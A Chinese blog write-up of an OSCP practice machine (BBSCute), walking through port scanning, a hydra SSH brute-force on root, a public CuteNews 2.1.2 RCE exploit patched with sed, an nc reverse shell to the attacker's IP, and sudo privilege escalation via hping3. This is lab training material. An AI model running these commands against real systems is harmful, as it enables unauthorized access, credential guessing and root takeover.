# 原创
：  从WEB到内网&&信息收集&&SSH爆破&&SUDO提权 ------打靶经验分享

# 从WEB到内网&amp;&amp;信息收集&amp;&amp;SSH爆破&amp;&amp;SUDO提权 ------打靶经验分享

### OSCP靶机-------BBSCute

今天来打一个OSCP的靶机，难度中等，花了我半天的时间，包含了端口探测，服务探测，ssh爆破，nc反弹shell，sudo提权等等…靶场难度中等，需要收集两个flag，一个flag低权限shell就可以获取，第二个要提权后才可以获取。希望大家看完可以有所收获。

### 启动环境：

启动VPN：openvpn universal.ovpn<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/7baec160d37c4cd7a07cea1a7b513175.png"/><br/> 攻击机IP为：192.168.45.193<br/> 启动目标靶机：<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/72ccaf7e9b3447208fd67a7d5b071836.png"/><br/> 目标靶机IP为： 192.168.164.128

### 信息收集

**1.端口**<br/> nmap扫描端口：<br/> `nmap --min-rate 10000 -p- 192.168.164.128`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/9ec523e7c3174f8481c0a867cd76a081.png"/><br/> 探测到了：22、80、88、110、995端口<br/> 端口服务探测：<br/> `nmap -p 22,80,88,110,995 -sV 192.168.164.128`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/49a85089a51d43fc90e39ff1586214fc.png"/>

探测到各端口对应服务为：<br/> 22-open-openssh 7.9p1<br/> 80-open-http<br/> 88-open-http<br/> 110-open-pop3<br/> 995-open-ssl/pop3

**2.端口测试**

**2.1** 22-SSH端口<br/> 发现22端口是ssh服务，且版本为OpenSSH 7.9p1 Debian，可以搜一下有没有对应的利用脚本。<br/> `msfconsole`<br/> `searchsploit openssh 7.9`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/4fa0116cf3544ae3a9dd6f666e05d583.png"/><br/> 莫有。<br/> 手工弱口令登一下试试。<br/> `ssh root@192.168.164.128 -p 22`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/0e7a770d70f343bda621c533feeb902e.png"/><br/> 试了还是没有弱口令登录成功，直接ssh爆破，字典选一本msf的，线程为6。<br/> `hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 -vV 192.168.164.128 ssh -s 22`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/f24f92bb2cd44c23b09a13d12f0649dd.png"/><br/> 等待ing，没有爆破出来。

**2.2** 80-http<br/> 80端口老规矩直接访问一下192.168.164.128:80<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/8c0ecdd4995b4cdcb7487d50a703b8ec.png"/><br/> apache2 的页面，curl看一下源码<br/> `curl http://192.168.164.128:80`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/c57e13e243e245618f36a761181a59b3.png"/><br/> 没有什么东西。dirsearch扫一下目录。<br/> `dirsearch -u http://192.168.164.128:80`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/218965187a43433f900d5f85777dff9b.png"/><br/> 还是有很多的，有登录界面？那就看一下Index.php(有这么多目录时，有限选择有用的测试，比如登录框）<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/9e5a9de0dd19455cb25b1ff43651283d.png"/><br/> 试了下弱口令和SQL注入好像都不行，看一下cms<br/> `whatweb http://192.168.164.128/index.php`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/cdcbe11b338d427193473fdf0237f388.png"/><br/> cms是cutenews。看一下具体版本。<br/> `curl http://192.168.164.128/index.php`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/4c211eb831f64db08110a5f5bfbb9454.png"/><br/> 有了具体版本，等下直接msf搜exp。

**2.3** 88-http<br/> 访问一下看看<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/ac799a104f7a407c880bb27ae910761c.png"/><br/> 看了一下，啥都没有呀。直接用80的开打吧。

### 攻击阶段

刚才得到的cms：cutenews 2.1.2<br/> msf直接搜exp<br/> `msfconsole`<br/> `searchsploit cutenews 2.1.2`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/083013fcc0444445b8c7971b9a867905.png"/><br/> 看到有rce就直接用了。选4。把exp拷贝出来。<br/> `cp /usr/share/exploitdb/exploits/php/webapps/48800.py exp`

<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/4d85d5faa9e64b3687cc7fccc3514209.png"/><br/> 查看使用信息<br/> `cat /usr/share/exploitdb/exploits/php/webapps/48800.py`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/1346ee175a39434db64a37a4c6de787c.png"/><br/> 就是python3运行后填上IP跟着走就对了。搞起来。<br/> `python3 48800.py`<br/> 输入url： http://192.168.164.128:80<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2c4d4a7ad13949b698b1e20f187878a1.png"/><br/> 怎么直接寄了。可能得修改exp，看看分析分析。<br/> `cat 48800.py`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/3ffbe6b8d09d46228966f0fcfa3a64ce.png"/><br/> 看到这里就懂了，它这里的URL里面多了/CuteNews，我们的是直接加的index.php，所以要修改一下。看一下有几个地方存在这个问题：<br/> `grep CuteNews 48800.py`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/3b564972ebba412e9ef0f62413423003.png"/><br/> 这vim修改真的过于逆天，不想vim修改的话有个小技巧，直接用sed 将所有的 “CuteNews/” 替换为空字符串<br/> `sed -i 's:CuteNews/::g' 48800.py`<br/> `grep CuteNews 48800.py`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/f44960f56ddc4585a854827e1290a37a.png"/><br/> 没有了，现在重新开打。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/a90fc98dd1d446ec81da6301a9e39f96.png"/><br/> 拿到shell了！

### 内网渗透

现在的shell是利用python的exp获取的，我们获取本地的shell会更方便一点，用nc反弹一下。<br/> 攻击机nc创建监听端口。<br/> `nc -lvvp 1234`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/c932731473274986bffaf6b7750c82f7.png"/>

目标shel输入反弹shell<br/> `nc -e /bin/bash 192.168.45.193 1234`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/94cb76d159e9464781d55f4a6326206d.png"/>

反弹获取的shell交互不友好，利用python创建一个稳定的shell<br/> `python -c "import pty;pty.spawn('/bin/bash')";`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/6a1095a54eaf4cee90461e234dafe2fb.png"/><br/> 获取flag1：<br/> `find / -name local.txt `<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2cde18fbd15149fc813226b67b231481.png"/><br/> `cat /var/www/local.txt`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/7dfe66d7a71d4a40bfad6848155cc133.png"/>

### 提权
1. -sudo提权<br/> `sudo -l`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/b64d5cd28fa949c297fd9af8917600d8.png"/><br/> 可以看到hping3有root权限。<br/> 访问 https://gtfobins.github.io 寻找<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/31ec364201864172bd15d09932f4b768.png"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/6e37aec2f66a46b88d341c97c4b1f124.png"/><br/> `hping3`<br/> 输入就直接是root了，666<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/dc9f514d16d2416383b5caa92547a700.png"/><br/> 查找flag2<br/> `cat /root/proof.txt`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/bea778b082d344d8942225dbeb4f4c01.png"/>